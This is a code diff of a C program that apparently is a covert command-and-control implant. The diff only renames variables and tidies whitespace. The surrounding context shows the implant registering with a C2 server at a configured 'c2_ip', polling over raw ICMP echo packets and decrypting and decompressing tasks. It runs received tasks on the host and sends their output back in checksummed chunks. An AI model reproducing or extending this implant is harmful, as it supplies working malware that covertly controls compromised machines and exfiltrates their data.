@@ -41,7 +41,7 @@ struct Config {
 	int compression_level;
 };
 
-uint64_t get_device_id(){
+uint64_t get_device_id() {
 
 	const char *paths[] = {
 		"/etc/machine-id",
@@ -98,7 +98,7 @@ uint16_t calculate_checksum(const unsigned char *data, size_t length) {
 
 }
 
-ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_length, unsigned char *received_data) {
+ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_length, unsigned char *received_reply) {
 
 	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
 	if (fd < 0) {
@@ -154,18 +154,20 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 		if (received_length < 0) {
 			continue;
 		}
+
 		size_t response_length = (size_t)received_length;
 		size_t ip_header_length = (response[0] & 0x0f) * 4;
 		if (response_length < ip_header_length + 8) {
 			continue;
 		}
+
 		unsigned char *reply = response + ip_header_length;
 		if (sender.sin_addr.s_addr != destination_ip.s_addr || reply[0] != ICMP_ECHOREPLY || reply[1] != 0 || memcmp(reply + 4, request + 4, 4) != 0 || calculate_checksum(reply, response_length - ip_header_length) != 0) {
 			continue;
 		}
 
 		size_t reply_data_length = response_length - ip_header_length - 8;
-		memcpy(received_data, reply + 8, reply_data_length);
+		memcpy(received_reply, reply + 8, reply_data_length);
 
 		close(fd);
 		return (ssize_t)reply_data_length;
@@ -246,7 +248,6 @@ unsigned char *decrypt_uncompress(const unsigned char *received_data, size_t rec
 
 	unsigned char nonce[12];
 	unsigned char authentication_tag[16];
-
 	if (received_data_length < sizeof(nonce) + sizeof(authentication_tag)) {
 		*received_message_length = 0;
 		return NULL;
@@ -284,7 +285,6 @@ unsigned char *decrypt_uncompress(const unsigned char *received_data, size_t rec
 	}
 
 	free(decrypted_data);
-
 	if (status != Z_OK) {
 		free(uncompressed_data);
 		*received_message_length = 0;
@@ -358,12 +358,12 @@ struct ChunkedTransfer *start_chunked_transfer(unsigned char *task_output, size_
 	transfer->chunk_checksums = malloc(transfer->total_amount_of_chunks * sizeof(uint32_t));
 
 	for (uint32_t i = 0; i < transfer->total_amount_of_chunks; i++) {
-		size_t offset = (size_t)i * MAX_CHUNK_SIZE;
-		size_t length = task_output_length - offset;
-		if (length > MAX_CHUNK_SIZE) {
-			length = MAX_CHUNK_SIZE;
+		size_t chunk_offset = (size_t)i * MAX_CHUNK_SIZE;
+		size_t chunk_data_length = task_output_length - chunk_offset;
+		if (chunk_data_length > MAX_CHUNK_SIZE) {
+			chunk_data_length = MAX_CHUNK_SIZE;
 		}
-		transfer->chunk_checksums[i] = (uint32_t)crc32(0, task_output + offset, length);
+		transfer->chunk_checksums[i] = (uint32_t)crc32(0, task_output + chunk_offset, chunk_data_length);
 	}
 
 	return transfer;
@@ -400,13 +400,13 @@ unsigned char *build_chunk(const struct ChunkedTransfer *transfer, size_t *chunk
 	}
 
 	uint32_t chunk_index = transfer->next_chunk_index;
-	size_t offset = (size_t)chunk_index * MAX_CHUNK_SIZE;
-	size_t data_length = transfer->task_output_length - offset;
-	if (data_length > MAX_CHUNK_SIZE) {
-		data_length = MAX_CHUNK_SIZE;
+	size_t chunk_offset = (size_t)chunk_index * MAX_CHUNK_SIZE;
+	size_t chunk_data_length = transfer->task_output_length - chunk_offset;
+	if (chunk_data_length > MAX_CHUNK_SIZE) {
+		chunk_data_length = MAX_CHUNK_SIZE;
 	}
 
-	size_t body_length = 16 + data_length;
+	size_t body_length = 16 + chunk_data_length;
 	unsigned char *body = malloc(body_length);
 
 	uint32_t network_byte_order;
@@ -418,7 +418,7 @@ unsigned char *build_chunk(const struct ChunkedTransfer *transfer, size_t *chunk
 	memcpy(body + 8, &network_byte_order, sizeof(network_byte_order));
 	network_byte_order = htobe32(transfer->chunk_checksums[chunk_index]);
 	memcpy(body + 12, &network_byte_order, sizeof(network_byte_order));
-	memcpy(body + 16, transfer->task_output + offset, data_length);
+	memcpy(body + 16, transfer->task_output + chunk_offset, chunk_data_length);
 
 	*chunk_body_length = body_length;
 	return body;
@@ -435,14 +435,12 @@ int handle_ack(struct ChunkedTransfer **transfer, const unsigned char *ack_body,
 	memcpy(&network_byte_order, ack_body, sizeof(network_byte_order));
 	uint32_t transfer_id = be32toh(network_byte_order);
 	memcpy(&network_byte_order, ack_body + 4, sizeof(network_byte_order));
-	uint32_t index = be32toh(network_byte_order);
-
-	if (transfer_id != (*transfer)->transfer_id || index != (*transfer)->next_chunk_index) {
+	uint32_t chunk_index = be32toh(network_byte_order);
+	if (transfer_id != (*transfer)->transfer_id || chunk_index != (*transfer)->next_chunk_index) {
 		return -1;
 	}
 
 	(*transfer)->next_chunk_index++;
-
 	if ((*transfer)->next_chunk_index >= (*transfer)->total_amount_of_chunks) {
 		free((*transfer)->task_output);
 		free((*transfer)->chunk_checksums);
@@ -478,7 +476,6 @@ void handle_reply(const unsigned char *reply, size_t reply_length, uint64_t devi
 	uint64_t received_device_id = 0;
 	unsigned char *received_message_body = NULL;
 	size_t received_message_body_length = 0;
-
 	if (parse_message(received_message, received_message_length, &received_message_type, &received_device_id, &received_message_body, &received_message_body_length) != 0) {
 		free(received_message);
 		return;
@@ -493,7 +490,6 @@ void handle_reply(const unsigned char *reply, size_t reply_length, uint64_t devi
 	if (received_message_type == MESSAGE_TASK && *task_pending_result == NULL && *transfer == NULL) {
 		*task_pending_result = execute_task((const char *)received_message_body, task_pending_result_length);
 	}
-
 	if (received_message_type == MESSAGE_ACK) {
 		handle_ack(transfer, received_message_body, received_message_body_length);
 	}
@@ -528,7 +524,6 @@ int main() {
 		uint8_t message_type = MESSAGE_POLL;
 		unsigned char *message_body = NULL;
 		size_t message_body_length = 0;
-
 		if (!registered) {
 			message_type = MESSAGE_REGISTER;
 			registered = 1;
@@ -564,7 +559,6 @@ int main() {
 
 			ssize_t reply_length = send_echo_request(configuration.c2_ip, sequence, data_to_send, data_to_send_length, reply);
 			sequence++;
-
 			if (message_type == MESSAGE_TASK_RESULT && reply_length >= 0) {
 				free(task_pending_result);
 				task_pending_result = NULL;
@@ -590,4 +584,3 @@ int main() {
 
 	return 0;
 }
-
